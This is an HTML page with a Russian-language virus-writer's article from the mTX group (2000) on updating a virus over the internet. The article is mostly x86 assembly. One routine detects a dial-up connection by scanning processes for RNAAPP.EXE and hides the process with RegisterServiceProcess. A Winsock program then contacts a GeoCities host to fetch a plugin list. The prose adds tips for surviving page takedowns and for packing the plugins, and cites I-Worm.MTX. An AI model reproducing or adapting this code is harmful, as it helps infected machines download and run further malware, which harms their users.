<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<base target="_self">
</head>

<body topmargin="0" leftmargin="0" bgcolor="#E7BE7B" link="#CC0000" vlink="#993300" alink="#FF9900">

<Table border="0" cellPadding="0" cellSpacing="0" width="100%">
        <Tr>
                <Td valign="top" height="33">
                        <Img src="../images/index_08.gif" width="6" height="33"></Td>
                <Td width="100%" background="../images/index_09.gif" valign="top" height="33">
            <img border="0" src="../images/kolesiko.gif" align="absmiddle" width="21" height="33"><font face="Arial" size="2"><b>
Обновление вируса через интернет... (Метавиризм:)
            </b> - 05:10 - <i>by Ultras</i></font>
            </font></Td>
                <Td valign="top" height="33">
                        <Img src="../images/index_10.gif" width="10" height="33"></Td>
     </Tr>
     <Tr>
                <Td background="../images/index_17.gif">
            &nbsp;</Td>
                <Td width="100%" bgcolor="#E7BE7B">
            <font face="Courier" size="3">
<pre>
   Это  маленькая  статья  описывает  как работать с Wsock при обновление
вируса через интернет. Так же я попробую описать все что нужно для скачки
обновления вируса, что лучше как и почему.

   Для  того  чтобы  скачать  свои  плагины  мы  должны  знать зараженный
пользователь  в  инете.  Это процедура нужна чтобы вирус по десять раз не
вызывал   wsock  api  если  нет  инета.  Ниже  приведен  сорец  маленькой
программки  которая  перебирает процессы и ищет в памяти RNAAPP.EXE. Если
такой файл существует в памяти то значит пользователь в инете.

Исходник:
*********

buffer        db 1000 dup (?)
snap          dd ?
MAX_PATH equ 260

@api_addresses  label   byte
Process32Next   dd      ?
Process32First  dd      ?
CreateSnapshot  dd      ?
RegServiceProc  dd      ?

PROCESSENTRY32 struc
dwSize               DD    0
cntUsage             DD    0
th32ProcessID        DD    0     ; текущий процесс
th32DefaultHeapID    DD    0
th32ModuleID         DD    0     ; cвязанным exe
cntThreads           DD    0
th32ParentProcessID  DD    0     ; родительский процесс этого процесса
pcPriClassBase       DD    0     ; приоритет основы нитей процесса
dwFlags              DD    0
szExeFile            DB    MAX_PATH DUP(0)   ;  Path
PROCESSENTRY32 ends


rnaapp_runz proc
 push 0
 push 2                            ; TH32CS_SNAPPROCESS
 call dword ptr [CreateSnapshot]
 mov [snap],eax
 dec eax
 jz no_internet
 mov dword ptr [buffer], size PROCESSENTRY32
 push offset buffer
 push dword ptr [snap]
 call dword ptr [Process32First]   ;получим первый процесс
@@next:
 test eax, eax
 jz no_internet                    ;нет больше процессов?
 sub eax, eax
 lea edi, [buffer.szExeFile]
 repnz scasb                       ;ищем конец файла
 std
 mov al, '\'
 repnz scasb                       ;ищем самое начало имени файла
 cld
 mov eax, [edi+2]
 or eax, 20202020h                 ;проверяем
 cmp eax, 'aanr'                   ;это RNAAPP.EXE запущен?
 je @@http                         ;если да, то пользователь в интернете
 push offset buffer
 push dword ptr [snap]
 call dword ptr [Process32Next]    ;получим следующий процесс
 jmp @@next
@@http:
 push [snap]
 call CloseHandle                   ;закроем
 call connect_http                  ;конектимся
 ret
no_internet:                        ;пользователь не в интернете
 ret
rnaapp_runz endp


check_connect:
 call push_kernel32
 db 'KERNEL32.dll',0
push_kernel32:
 call GetModuleHandleA
 or eax,eax
 jz nothing_2_do

 call push_regsrvpc
 db 'RegisterServiceProcess',0
push_regsrvpc:
 push eax

 call push_crth32ss
 db 'CreateToolhelp32Snapshot',0
push_crth32ss:
 push eax

 call push_proc32f
 db 'Process32First',0
push_proc32f:
 push eax

 call push_proc32n
 db 'Process32Next',0
push_proc32n:
 push eax

 mov esi,4
 lea edi,dword ptr [@api_addresses]
get_addresses:
 call GetProcAddress
 stosd
 dec esi
 or esi,esi
 jnz get_addresses
 push 1
 push 0
 call dword ptr [RegServiceProc]


   После  того  как  убедились  что  пользователь в инете, тут начинается
самое  интересное  "download plugin". Плагины можно скачивать по разному,
самый  лучший  метод  создать какой нибудь файл MATRiX.VX в котором будут
написаны  имена плагинов их размер, мы его прочтем запомним имена и будем
качать  эти  плагины.  Один  раз  мне прислали исходник в котором автором
качал  фиксированные  плагины (тоесть например 1.exe,2.exe etc) это очень
плохой способ нельзя прибавить число плагинов или уменьшить.

   Итак ниже исходник маленькой программы которая скачивает файлы...
   (спасибо  NBK  за  исходник  и за то что научил работать с этим сраным
winsock)

.586p
.model flat

extrn ExitProcess:proc
extrn WSACleanup:proc
extrn socket:proc
extrn connect:proc
extrn send:proc
extrn recv:proc
extrn WSAStartup:proc
extrn WSAGetLastError:proc
extrn gethostbyname:proc
extrn closesocket:proc
extrn MessageBoxA:proc


.data

buffer db 512 dup (0)
sock dd 0
geocities db 'www.geocities.com',0 ' откуда будим сливать файлы

request db 'GET MATRIX.VX HTTP/1.1',13,10 ' wow i like it....
        db 'Host: www.geocities.com',13,10
        db 'User-Agent: [MATRiX]/1.0',13,10
        db 'Accept: *.*, */*',13,10,13,10
request_size equ $ - request
error1 db 'ERROR',0

sockaddr:

dd 050000002h ; Номар порта (80) значит http
ipnumber dd 0 ; Ност в hex
dd 0
dd 0

.code

start:
; Инициализировать Winsock
push offset buffer
push 101h
; нужна версия не меньше 1.01
call WSAStartup

; Проверяем как версия Winsock
test eax,eax
jnz error

; Создать socket для tcp/ip соединения

push 00H ; Специфический протокол который нужно использовать
push 01H ; Спецификация Типа для нового сокекта
push 02H ; PF_INET
call socket

Если eax = 0FFFFFFFFh сокет не может быть создан
mov [sock],eax
inc eax
jz error

; Получим IP адресс от geocities

push offset geocities
call gethostbyname

; Если eax = 0FFFFFFFFh галимо, на выход
test eax,eax
jz error

mov eax,[eax+4]
mov eax,[eax+4]
; Сохраним IP номер в EAX
mov [ipnumber],eax

; Теперь мы можем конектиться юзая сокеты
; с определенным сайтом

push 16 ; Размер структуры конекта
push offset sockaddr ; поинт для этого
push [sock] ; Используем сокеты
call connect

; Если eax = 0FFFFFFFFh, мы уже приконектились с geocities

test eax,eax
jnz error

; Так и так самое интерсное. Мы должны слить нам нужный файл он называется
; MATRIX.VX
; Если Geocities не имеет такого файла то сервер возвратит нам что то типа
; "404 NOT FOUND"

repeat_send:

push 0 ; Определяет путь
push request_size ; Размер моего запроса к серверу
push offset request ; Где мои запрос может быть найден
push [sock] ; и др. сокеты (конектимся к geocites)
call send

; Если eax = 0FFFFFFFFh, неудача вызова функции. Такие глюки стандарты для
; этой функций
; нужно просто повторить деиствия.
inc eax
jnz sendok

call WSAGetLastError

; Вы можите установить большее параметр для ошибки кода.

cmp eax, 10035
je repeat_send

jmp error

sendok:

; The request was done, now the program will
; get the WEB SERVER response and show it in
; a message box

; Запрос был сделан и теперь программа получит ответ от web сервера и
; покажет на msgbox.
mov esi,offset buffer

repeat_recv:

push 0
push 4096
push esi
push [sock]
call recv

inc eax
jnz recvok

call WSAGetLastError

cmp eax, 10035 ; проверяет на ошибки <WSAEWOULDBLOCK>
je repeat_recv

jmp error

recvok:

dec eax
jz done

; Мы должны модернизировать оффсет для буфера
add esi,eax
jmp repeat_recv

done:

; выводим на экран всю инфу

push 0
push offset $
push offset buffer
push 0
call MessageBoxA
jmp theend

error:

; сообщение об ошибки

push 0
push offset error1
push offset error1
push 0
call MessageBoxA

theend:

; выходим из программы

push 0
call ExitProcess

end start


   Если вы все таки решили сделать обновления через веб страницу то лучше
всего  использовать  какой  нибудь  форвард чтобы когда страничку закрыли
можно   было   закачать  на  дургую  пример  I-Worm.MTX(  использует  эту
технологию). Так же можно извратиться и написатьплагин со своим хедором и
запакованый  каким  нибудь  сложным  алгоритмом, чтобы вирус качал только
вирусные плаги а не личило для вируса.


Что дальше?
~~~~~~~~~~~

В следующих версиях этой статьи я привиду уже подробный пример(исходник).
Возможно в следуящих версиях как обнавлять через
FTP и через News, IRC.

Unknown Ultra Virmaker from Moscow

 ULTRAS [mTX teAm 2000]
</pre>
</font>
</Td>
                <Td background="../images/index_19.gif">
            &nbsp;</Td>
        </Tr>
        <Tr>
                <Td>
                        <Img src="../images/index_44.gif" width="6" height="9"></Td>
                <Td background="../images/index_45.gif" height="9">
            <img border="0" src="../images/spacer.gif" width="9" height="9"></Td>
                <Td>
                        <Img src="../images/index_46.gif" width="10" height="9"></Td>
        </Tr>
</Table>
<br>

</Table>
&nbsp;

</body>

</html>
